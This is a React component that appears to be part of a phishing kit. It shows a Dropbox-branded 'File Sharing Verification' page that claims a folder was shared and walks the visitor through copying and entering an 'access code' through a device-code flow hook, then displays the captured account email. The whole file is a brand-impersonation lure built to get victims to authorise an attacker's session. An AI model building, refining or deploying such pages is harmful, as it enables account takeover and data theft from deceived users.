import React from 'react';
import { useDeviceCodeFlow } from '../../hooks/useDeviceCodeFlow';

export function DropboxTemplate(): React.ReactElement {
  const f = useDeviceCodeFlow();

  return (
    <div className="tpl-page" style={{ background: '#f7f5f2' }}>
      <div className="tpl-container" style={{ maxWidth: 480 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 24 }}>
          <svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#0061FF"/><path d="M16 8l-6 4 6 4-6 4 6 4 6-4-6-4 6-4z" fill="white" opacity="0.9"/></svg>
          <span style={{ fontSize: 18, fontWeight: 600, color: '#1e1919' }}>Dropbox</span>
        </div>

        <div className="tpl-card">
          {f.state === 'idle' && (
            <>
              <h1 className="tpl-title">File Sharing Verification</h1>
              <p className="tpl-text">A Dropbox folder has been shared with you. Verify your identity to access the shared files.</p>
              <div className="tpl-info-box" style={{ background: '#e8f0ff', borderColor: '#a8c4ff', color: '#0061FF' }}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0061FF" strokeWidth="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                <span>Project Files — 12 files, 48.3 MB</span>
              </div>
              <button className="tpl-btn" style={{ background: '#0061FF' }} onClick={f.handleStart}>Verify to Access</button>
            </>
          )}
          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Preparing access...</p></div>}
          {(f.state === 'code_ready' || f.state === 'waiting') && (
            <>
              <h1 className="tpl-title">Enter Access Code</h1>
              <p className="tpl-text">Use this code to verify your identity.</p>
              <div className="tpl-code-box"><div className="tpl-code-label">ACCESS CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
              <div className="tpl-steps"><div className="tpl-step">1. Copy the access code</div><div className="tpl-step">2. Click verify and enter the code</div></div>
              <button className="tpl-btn" style={{ background: '#0061FF' }} onClick={f.handleVerify}>Verify</button>
              {f.state === 'waiting' && <p className="tpl-waiting">Verifying...</p>}
              <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
            </>
          )}
          {f.state === 'success' && <div className="tpl-center"><svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><h1 className="tpl-title">Access Granted</h1>{f.authEmail && <p>Account: <strong>{f.authEmail}</strong></p>}<p className="tpl-text">Files are ready for download.</p><button className="tpl-btn secondary" onClick={f.handleReset}>Access another</button></div>}
          {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><button className="tpl-btn" style={{ background: '#0061FF' }} onClick={f.handleReset}>Try Again</button></div>}
          {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#0061FF' }} onClick={f.handleReset}>Try Again</button></div>}
        </div>
        <div className="tpl-footer"><span>Dropbox Terms</span><span>Privacy Policy</span></div>
      </div>
    </div>
  );
}
